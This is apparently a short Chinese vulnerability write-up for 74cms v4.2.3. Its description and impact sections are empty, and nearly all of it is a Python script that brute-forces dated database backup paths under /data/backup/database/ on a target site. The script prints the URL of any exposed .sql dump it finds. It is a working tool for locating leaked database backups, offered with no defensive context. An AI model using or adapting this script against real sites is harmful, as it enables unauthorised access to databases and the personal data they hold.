74cms v4.2.3 备份文件爆破
=========================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    # -*- coding: utf-8 -*-
    -------------------------------------------------
       File Name：     74cms_MysqlBak
       Description :
       Author :       CoolCat
       date：          2019/1/5
    -------------------------------------------------
       Change Activity:
                       2019/1/5:
    -------------------------------------------------
    """
    __author__ = 'CoolCat'

    import requests

    def getBak(time):
        print("[running]:正在查询" + time + "是否存在备份")
        dir = time + "_1"
        filename = dir + "_1.sql"
        url = target + "//data/backup/database/" + dir +"/"+ filename
        session = requests.Session()
        headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0",
                   "Connection": "close", "Accept-Language": "en", "Accept-Encoding": "gzip, deflate"}
        cookies = {"think_language": "en", "think_template": "default", "PHPSESSID": "6d86a34ec9125b2d08ebbb7630838682"}
        response = session.get(url=url, headers=headers, cookies=cookies)
        if response.status_code == 200:
            print(url)
            exit()

    if __name__ == '__main__':

        global target
        target = "http://www.target.com"

        for year in range(2017, 2020):
            for mouth in range(1, 13):
                for day in range(1, 31):
                    time = (str(year) + str('%02d' % mouth) + str('%02d' % day))
                    getBak(time)
